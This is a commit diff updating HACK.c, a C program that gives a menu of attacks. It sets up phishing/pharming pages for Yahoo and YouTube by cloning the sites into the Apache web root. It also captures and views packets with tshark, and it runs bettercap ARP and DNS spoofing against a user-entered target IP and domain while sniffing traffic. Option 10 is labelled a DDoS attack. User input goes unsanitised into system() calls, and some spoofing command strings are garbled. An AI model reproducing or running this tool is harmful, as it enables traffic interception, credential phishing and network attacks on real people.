babab1b6d2c34e42fa0a0275f804baf9e2896607
Syed Shaheer Ali <75204406+SyedShaheerA@users.noreply.github.com>
2023-05-17 00:49:36 +0500

    Update HACK.c

--- HACK.c
+++ HACK.c
@@ -5,16 +5,18 @@
 int main(int args)
 {
 
-	int option=0;
+	int option=0,option2=0,frame=0;
+	char command2[100];
 	printf("Enter the option from selected choice\n");
 	printf("1. For checking the devices connected to you system.\n");
 	printf("2. TO check your domain ip.\n");
-	printf("3. set up YAHOO Physhing attack\n");
+	printf("3. set up YAHOO Pharming attack\n");
 	printf("4. Start phshing attack\n");
 	printf("5. Stop Physhing attack\n");
-	printf("6. set up YOUTUBE Physhing attack\n");
+	printf("6. set up YOUTUBE Pharming attack\n");
 	printf("7. PACKET CAPTURE COMMAND\n");
-	printf("8: Launch dns spoof");
+	printf("8: Launch dns spoof\n");
+	printf("9: View captured packets");
 	scanf("%d",&option);
 	
 	
@@ -43,6 +45,8 @@ int main(int args)
 		system("service apache2 start");
 		printf("APACHE STARTED");
 		
+		
+		
 	}
 	else if(option == 5)
 	{
@@ -51,17 +55,38 @@ int main(int args)
 	}
 	else if(option == 6)
 	{
-		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget https://youtube.com ; dir");
+		system("cd /var; mkdir www; cd www; mkdir html; cd html; rm -f index.html ; wget http://youtube.com ;");
 	}
 	else if(option ==7)
 	{
-		system("tshark -i eth0");
+		printf("Packet capture started. \nRun program in seperate window now\nPress ctrl+c to stop capture");
+		system("tshark -i eth0 -w info.pcap");
 
+	}
+	else if(option == 9){
+		system("tshark -r info.pcap http");
+		printf("1. View packets with details");
+		printf("2. View details of specific packet");
+		scanf("%d",&option2);
+		if(option2==1){
+			system("tshark -r info.pcap -V");
+		}
+		else if(option2==2){
+			printf("Enter frame number of packet:");
+			scanf("%d",&frame);
+			sprintf(command2,"tshark -r info.pcap -Y 'frame.number==%d' -V",frame);
+			system(command2);
+			
+		}
 	}
 	else if(option == 8)
 	{
 		
-		char command[200];
+		// Assuming IPv4 address
+    
+		//printf("Enter the target IP address: ");
+    		//scan
+    				char command[200];
     		char ip_address[16]; // Assuming IPv4 address
     		char attack[100];
 		printf("Enter the target IP address: ");
@@ -70,15 +95,17 @@ int main(int args)
     		printf("\n enter the website ");
     		scanf("%99s", attack);
     	
-		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on'", ip_address, attack);
+		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on;net.sniff on'", ip_address, attack);
 
     
     		system(command);
+
+    
+    		//system(command);
     
 
 	}
-	else if(option == 9)
-	{
+	else if(option==10){
 		printf("SHHHHHHH lets launch ddos attack...");
 		char command[200];
     		char ip_address[16]; // Assuming IPv4 address
@@ -89,7 +116,7 @@ int main(int args)
     		printf("\n enter the website ");
     		scanf("%99s", attack);
     	
-		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s;dns.spoof on; net.sniff on, apr.spoof on'", ip_address, attack);
+		 sprintf(command, "bettercap -iface eth0 -eval 'set arp.spoof.fullduplex true; set arp.spoof.target %s; set dns.spoof.address 192.168.100.26; set dns.spoof.all true; set dns.spoof.domains %s; dns.spoof on;set net.sniff on,set apr.spoof on'", ip_address, attack);
 
     
     		system(command);
